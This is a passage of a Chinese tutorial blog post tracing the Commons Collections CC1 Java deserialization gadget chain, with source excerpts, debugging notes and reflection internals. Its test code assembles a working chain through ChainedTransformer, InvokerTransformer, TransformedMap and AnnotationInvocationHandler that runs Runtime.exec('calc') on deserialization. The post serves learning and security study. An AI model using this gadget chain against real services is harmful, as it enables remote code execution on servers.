class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;  </span><br><span class="line">    String name = memberValue.getKey();  </span><br><span class="line">    Class&lt;?&gt; memberType = memberTypes.get(name);  </span><br><span class="line">    if (memberType != null) &#123;  // i.e. member still exists  </span><br><span class="line">        Object value = memberValue.getValue();  </span><br><span class="line">        if (!(memberType.isInstance(value) ||  </span><br><span class="line">              value instanceof ExceptionProxy)) &#123;  </span><br><span class="line">            memberValue.setValue(  </span><br><span class="line">                new AnnotationTypeMismatchExceptionProxy(  </span><br><span class="line">                    value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(  </span><br><span class="line">                        annotationType.members().get(name)));  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先有两层if<br>第一层是membertype不为空，他也是个map</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure><p>也就是memberType.get()不能为空<br>所以传入一个已经存在的东西</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br></pre></td></tr></table></figure><p>所以要知道他是哪来的，annotationType是一个注解type<br>这个注解type又是什么东西呢，点进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">AnnotationType annotationType = null;  </span><br><span class="line">try &#123;  </span><br><span class="line">    annotationType = AnnotationType.getInstance(type);  </span><br><span class="line">&#125; catch(IllegalArgumentException e) &#123;  </span><br><span class="line">    // Class is no longer an annotation type; time to punch out  </span><br><span class="line">    throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);  </span><br></pre></td></tr></table></figure><p>发现是一个实例化的东西是注解type<br>等等，传入的叫”type“？</p><pre><code>开门复动竹，疑是故人来。---《竹窗闻风寄苗发司空曙》</code></pre><p>我们前面构造AnnotationInvocationHandler的时候自己传进去的不就是type吗</p><p>也就是annotationType是实例化我们传入的type，然后再调用annotationType的memberTypes<br>那就继续构造一下喽</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void test() throws Exception &#123;  </span><br><span class="line">    AnnotationType annotationType = AnnotationType.getInstance(Target.class);  </span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; types = annotationType.memberTypes();  </span><br><span class="line">    for (Map.Entry&lt;String, Class&lt;?&gt;&gt; entry : types.entrySet()) &#123;  </span><br><span class="line">        System.out.println(entry);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;C:\Program Files (x86)\Java\jdk1.8.0_65\bin\java.exe&quot; </span><br><span class="line">value=class [Ljava.lang.annotation.ElementType;</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br></pre></td></tr></table></figure><p>发现是有东西的，把它当作name传入，第一层if就不会为空</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String name = memberValue.getKey();</span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure><p>那name我们怎么控制传入呢，发现他是memberValue的getKey方法获取<br>等等，疑是故人来….<br>我们传入的map就是memberValue<br>所以看看getKey()是干什么的吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">K getKey();  </span><br><span class="line">  </span><br><span class="line">/**  </span><br><span class="line"> * Returns the value corresponding to this entry.  If the mapping * has been removed from the backing map (by the iterator&#x27;s * &lt;tt&gt;remove&lt;/tt&gt; operation), the results of this call are undefined.  </span><br><span class="line"> * * @return the value corresponding to this entry  </span><br><span class="line"> * @throws IllegalStateException implementations may, but are not  </span><br><span class="line"> *         required to, throw this exception if the entry has been *         removed from the backing map. */</span><br><span class="line">就是简简单单的拿到key</span><br></pre></td></tr></table></figure><p>所以就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; memberType = memberTypes.get(map.key);</span><br></pre></td></tr></table></figure><p>那就改一下喽</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);</span><br><span class="line">//value，他的值不重要，所以不变</span><br></pre></td></tr></table></figure><p>调试一下</p><img src="/2025/07/17/CC1%E9%93%BE/10.png" class=""><p>果然会运行到这里，name的值就等于value，然后走到下一个节点</p><img src="/2025/07/17/CC1%E9%93%BE/11.png" class=""><p>但是这里我们突然发现了一个问题，首先我们要找的是<br>调用我们的map.setValue()并且自己重写了readObject()并且执行了map.setValue()并且实现了序列化，符合这些要求的就可以成为我们的出口类<br>但是这里的map.setValue()没有给我们可控的地方，链子断了</p><p>但是别急，我们的补充介绍中还说过一种ConstantTransformer，只可以不管输入什么，都会返回构造值，那岂不是可以不管传入什么都会Runtime.getRuntime()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);  </span><br><span class="line">ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">constantTransformer.transform(&quot;123456&quot;);</span><br></pre></td></tr></table></figure><p>妙哉，感觉已经成功了，等下不对！什么时候陷入的幻觉！</p><pre><code>又疑秋水泠泠响，似有鸣琴上翠微。---《宫词》</code></pre><p>这样构造确实没问题，但是这样的话，就直接给value赋值好了，checkSetValue()传入就不重要了，我怎么调用invoke()链子呢，直接就断掉了<br>那怎么办，有没有别的办法呢，有的，兄弟有的<br><mark>ChainedTransformer</mark></p><p>先简单的试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void test2() throws Exception &#123;  </span><br><span class="line">    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">            constantTransformer,  </span><br><span class="line">            invokerTransformer,  </span><br><span class="line">    &#125;);  </span><br><span class="line">    chainedTransformer.transform(&quot;123456&quot;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>弹出计算器<br>所以就可以继续构造了<br>把链transformer传给(decorate)maptransformr，复制过来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">map.put(&quot;value&quot;, null);  </span><br><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, invokerTransformer);</span><br></pre></td></tr></table></figure><p>然后把构造好的链transfrmer传入进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">map.put(&quot;value&quot;, null);  </span><br><span class="line">Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);</span><br></pre></td></tr></table></figure><p>然后把反射(decorate)map传进去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void test2() throws Exception &#123;  </span><br><span class="line">    ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">    InvokerTransformer invokerTransformer = new InvokerTransformer(  </span><br><span class="line">            &quot;exec&quot;,  </span><br><span class="line">            new Class[]&#123;String.class&#125;,  </span><br><span class="line">            new Object[]&#123;&quot;calc&quot;&#125;  </span><br><span class="line">    );  </span><br><span class="line">    ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">            constantTransformer,  </span><br><span class="line">            invokerTransformer,  </span><br><span class="line">    &#125;);  </span><br><span class="line">    HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">    map.put(&quot;value&quot;, null);  </span><br><span class="line">    Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">    Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">    constructor.setAccessible(true);  </span><br><span class="line">    Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">    CCTest.serialize(o);  </span><br><span class="line">    CCTest.unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行一下报错了</p><img src="/2025/07/17/CC1%E9%93%BE/12.png" class=""><p>我们的Runtime没有实现反序列化接口<br>但是有个好消息，Class是可以被序列化的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> */  </span><br><span class="line">public final class Class&lt;T&gt; implements java.io.Serializable,  </span><br><span class="line">                              GenericDeclaration,  </span><br><span class="line">                              Type,  </span><br><span class="line">                              AnnotatedElement &#123;  </span><br><span class="line">    private static final int ANNOTATION= 0x00002000;  </span><br><span class="line">    private static final int ENUM      = 0x00004000;  </span><br><span class="line">    private static final int SYNTHETIC = 0x00001000;</span><br></pre></td></tr></table></figure><p>那能不能使用class去调用Runtime拿到runtime对象呢，可以的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@Test  </span><br><span class="line">public void test3() throws Exception &#123;  </span><br><span class="line">    Class clazz = Runtime.class;  </span><br><span class="line">    Method getRuntimeMethod = clazz.getDeclaredMethod(&quot;getRuntime&quot;, null);  </span><br><span class="line">    Object invoke = getRuntimeMethod.invoke(null);  </span><br><span class="line">    System.out.println(invoke);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">打印结果为</span><br><span class="line">&quot;C:\Program Files (x86)\Java\jdk1.8.0_65\bin\java.exe&quot; </span><br><span class="line">java.lang.Runtime@1a8dfcc</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>说明可以反射，拿到对象<br>那拿到对象了我们还想调用危险函数该怎么做呢，我们再来一次反射</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method execMethod = clazz.getMethod(&quot;exec&quot;, String.class);  </span><br><span class="line">execMethod.invoke(invoke, &quot;calc&quot;);</span><br></pre></td></tr></table></figure><p>发现可以，弹出了计算器<br>那么我们只要把这两段改造成transforminvoke就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    public void test2() throws Exception &#123;  </span><br><span class="line">/*        ConstantTransformer constantTransformer = new ConstantTransformer(Runtime.getRuntime());  </span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(                &quot;exec&quot;,                new Class[]&#123;String.class&#125;,                new Object[]&#123;&quot;calc&quot;&#125;        );*/  </span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">        &#125;);  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put(&quot;value&quot;, &quot;b&quot;);  </span><br><span class="line">        Map&lt;Object,Object&gt; decorated = TransformedMap.decorate(map, null, chainedTransformer);  </span><br><span class="line">  </span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);  </span><br><span class="line">        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        constructor.setAccessible(true);  </span><br><span class="line">        Object o = constructor.newInstance(Target.class, decorated);  </span><br><span class="line">        CCTest.serialize(o);  </span><br><span class="line">        CCTest.unserialize(&quot;ser.bin&quot;);  </span><br><span class="line">  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>核心在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;  </span><br><span class="line">        new ConstantTransformer(Runtime.class),  </span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;),  </span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;),  </span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>至此我们完整了整条链子</p><img src="/2025/07/17/CC1%E9%93%BE/13.png" class=""><h2 id="关于其他用到的补充性介绍"><a href="#关于其他用到的补充性介绍" class="headerlink" title="关于其他用到的补充性介绍"></a>关于其他用到的补充性介绍</h2><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p>这是一种不管输入什么东西，都能够返回指定内容的transform</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class ConstantTransformer implements Transformer, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">    /** Serial version UID */  </span><br><span class="line">    private static final long serialVersionUID = 6374440726369055124L;  </span><br><span class="line">      </span><br><span class="line">    /** Returns null each time */  </span><br><span class="line">    public static final Transformer NULL_INSTANCE = new ConstantTransformer(null);  </span><br><span class="line">  </span><br><span class="line">    /** The closures to call in turn */  </span><br><span class="line">    private final Object iConstant;</span><br><span class="line"></span><br><span class="line">public Object transform(Object input) &#123;  </span><br><span class="line">    return iConstant;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他只会正常返回你构造传入的constantToReturn</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public class ChainedTransformer implements Transformer, Serializable &#123;  </span><br><span class="line">  </span><br><span class="line">    /** Serial version UID */  </span><br><span class="line">    private static final long serialVersionUID = 3514945074733160196L;  </span><br><span class="line">  </span><br><span class="line">    /** The transformers to call in turn */  </span><br><span class="line">    private final Transformer[] iTransformers;</span><br><span class="line">public ChainedTransformer(Transformer[] transformers) &#123;  </span><br><span class="line">    super();  </span><br><span class="line">    iTransformers = transformers;  </span><br><span class="line">&#125;</span><br><span class="line">public Object transform(Object object) &#123;  </span><br><span class="line">    for (int i = 0; i &lt; iTransformers.length; i++) &#123;  </span><br><span class="line">        object = iTransformers[i].transform(object);  </span><br><span class="line">    &#125;  </span><br><span class="line">    return object;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>链式传输，传入的是一个transformer数组，链式调用这一组transformer，前一个的输出是后一个的输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">transformer[2].transform(</span><br><span class="line">transformer[1].tranfsform(</span><br><span class="line">transformer[0].transform(object))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="关于invoke-的补充性介绍"><a href="#关于invoke-的补充性介绍" class="headerlink" title="关于invoke()的补充性介绍"></a>关于invoke()的补充性介绍</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>如果你真的自己做一遍，并且让要求自己对每个细节是如何运作的都搞清楚，就会对这里的invoke()产生疑问，他是怎么调用的方法呢，怎么就拼接在一起了呢。我看很多文章都没有说，搞得一知半解，尤其是在链子连接的那一部分，于是仔细看了看。</p><p>首先我们不得不补充一点前备知识，可能你看的很难受，我也没有办法，这是必须要知道的</p><p>关于”<strong>隐藏反射源头</strong>“<br>这里的<code>method.invoke(obj, args)</code> 到底是怎么知道“要调用哪个方法”的</p><p>答案是<code>method</code> 本身就是一个 <strong>Method 对象</strong>，它在创建时就已经确定了要调用的方法 —— 包括类、方法名、参数类型、返回类型等信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Method method = SomeClass.class.getDeclaredMethod(&quot;foo&quot;, String.class, int.class);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>你看到这大概率一愣，这写的什么东西，于是带着疑惑点开invoke的定义</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//内部注解，表示这个方法会根据&quot;调用者类&quot;决定行为</span><br><span class="line">@CallerSensitive  </span><br><span class="line">public Object invoke(Object obj, Object... args)  </span><br><span class="line">    throws IllegalAccessException, IllegalArgumentException,  </span><br><span class="line">       InvocationTargetException  </span><br><span class="line">&#123;  </span><br><span class="line">//这一个判断表示是否已经进行了Java的访问控制判断</span><br><span class="line">    if (!override) &#123;  </span><br><span class="line">    //如果快速检查表明调用权限可能不足，就会获取调用者类</span><br><span class="line">        if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;  </span><br><span class="line">            Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">            //然后进行权限检查  </span><br><span class="line">            checkAccess(caller, clazz, obj, modifiers);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    //至此，上半部分全都是对权限进行的操作</span><br><span class="line">    //然后来看下半部分</span><br><span class="line">    MethodAccessor ma = methodAccessor;             // read volatile  </span><br><span class="line">    if (ma == null) &#123;  </span><br><span class="line">        ma = acquireMethodAccessor();  </span><br><span class="line">    &#125;  </span><br><span class="line">    return ma.invoke(obj, args);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个下半部分也很神秘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MethodAccessor ma = methodAccessor;             // read volatile  </span><br><span class="line">if (ma == null) &#123;  </span><br><span class="line">    ma = acquireMethodAccessor();  </span><br><span class="line">&#125;  </span><br><span class="line">return ma.invoke(obj, args);  </span><br></pre></td></tr></table></figure><p>这里的 MethodAccessor是 <code>java.lang.reflect.Method</code> 类的一个字段，类型为 <code>MethodAccessor</code> 接口，她负责真正执行目标方法（即 <code>obj.method(args)</code>）的底层调用器<br>如果<code>methodAccessor</code> 还没初始化，就通过 <code>acquireMethodAccessor()</code> 创建一个。创建的同时还会将其赋值给 <code>methodAccessor</code> 字段（写入 volatile 字段），确保后续可见性。</p><p>MethodAccessor简单来说是实现Method.invoke()的内部逻辑调用，有两个主要实现类sun.reflect.NativeMethodAccessorImpl和sun.reflect.GeneratedMethodAccessorN(N是数字)</p><p><code>NativeMethodAccessorImpl</code>：<strong>初始默认实现（native 层调用）</strong></p><ul><li>初次反射调用默认使用它；</li><li>调用的是 JVM 内部的 native 方法（<code>invoke0()</code>）；</li><li>速度较慢，但实现简单，开销可控；</li><li>一旦调用次数超过 15 次（默认），会被替换为 <code>GeneratedMethodAccessorN</code>（膨胀优化）。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class NativeMethodAccessorImpl extends MethodAccessorImpl &#123;</span><br><span class="line">    private final Method method;</span><br><span class="line">    private DelegatingMethodAccessorImpl parent;</span><br><span class="line">    private int numInvocations;</span><br><span class="line"></span><br><span class="line">    public Object invoke(Object obj, Object[] args) throws InvocationTargetException &#123;</span><br><span class="line">        numInvocations++;</span><br><span class="line">        if (numInvocations &gt; ReflectionFactory.inflationThreshold()) &#123;</span><br><span class="line">            MethodAccessorImpl acc = </span><br><span class="line">                (MethodAccessorImpl) new MethodAccessorGenerator()</span><br><span class="line">                    .generateMethod(method.getDeclaringClass(), method.getName(), ...);</span><br><span class="line">            parent.setDelegate(acc);</span><br><span class="line">        &#125;</span><br><span class="line">        return invoke0(method, obj, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static native Object invoke0(Method method, Object obj, Object[] args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>invoke0()</code> 是一个 native 方法，定义在 JVM 中的 C++ 层（例如 <code>methodHandles.cpp</code>），用于实际解析方法、调用栈等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JVM_InvokeMethod(JNIEnv* env, jclass cls, jobject obj, jobjectArray args);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第二个主要实现类是一个动态生成类，不需要JNI，直接走Java方法调用，<mark>将目标方法直接转化成字节码中的obj.method(args)调用</mark>，调用超过 15 次后由 <code>NativeMethodAccessorImpl</code> 替换成这个，此外还可以禁用native,直接生成这个类。</p><p>比如调用了：method.invoke(runtime, “calc”)</p><figure class="highlight plaintext"><figcaption><span>class GeneratedMethodAccessor2 implements MethodAccessor &#123;</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    public Object invoke(Object obj, Object[] args) &#123;</span><br><span class="line">        return ((Runtime) obj).exec((String) args[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码会被动态编译为字节码，在堆中加载后赋值给 <code>MethodAccessor</code></p><p>总结来说<code>Method.invoke()</code> 本身不执行方法，而是把调用交给 <code>MethodAccessor</code>，进行方法的执行</p><h4 id="区分"><a href="#区分" class="headerlink" title="区分"></a>区分</h4><p><code>getMethod()</code>和getDeclaredMethod()<br>二者都能返回一个Method对象，范围不同<br><code>getMethod()</code>查找的是当前类以及所以父类的public方法，不包含私有方法，包含继承方法</p><p>getDeclaredMethod()之查找当前类本身定义的方法，包含私有方法，不包含继承方法</p><h1 id="一点碎碎念"><a href="#一点碎碎念" class="headerlink" title="一点碎碎念"></a>一点碎碎念</h1><pre><code>而在现实中，在我们亲身体验着每分每秒不断流逝的现实中，那一切都是如此沉重，也如此真切，他的轻狂，嚣张，意气风发，他的迷惘，怀疑，妄自菲薄，引喻失义，再然后他开始懊悔，开始慢慢接受过去。我们像是亲眼目睹着一个年轻的灵魂，从自我的狭隘世界，穿过一层名为现实的胎衣，终而降生于此--apex夺冠转记</code></pre>]]></content>
    
    
      
      
